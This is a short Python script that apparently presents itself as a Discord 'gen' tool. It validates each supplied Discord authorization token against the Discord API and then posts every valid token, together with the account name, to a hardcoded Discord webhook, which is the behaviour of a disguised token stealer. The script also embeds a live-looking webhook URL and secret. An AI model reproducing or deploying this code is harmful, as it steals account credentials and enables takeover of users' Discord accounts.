import requests
import json
def start_gen(tokens):
  print("Starting gen \n")
  for token in tokens:

    header = {"authorization": token}
    response = requests.get("https://discord.com/api/users/@me",
                            headers=header)

    if response.status_code == 200:
      data = response.json()
      account_name = f"{data['username']}#{data['discriminator']}"
            
      webhook_url = 'https://discord.com/api/webhooks/1119967282957914264/O2wc0S3WoXS5hSbMhLEmXpedT-6stl9Oh2crHGi-eiv0SSnv5Vqz1186YG0uvGgawJpP'
      message = {'content': f'''
      {token} - {account_name}
      '''}
      
      response = requests.post(webhook_url, data=json.dumps(message), headers={'Content-Type': 'application/json'})
    



    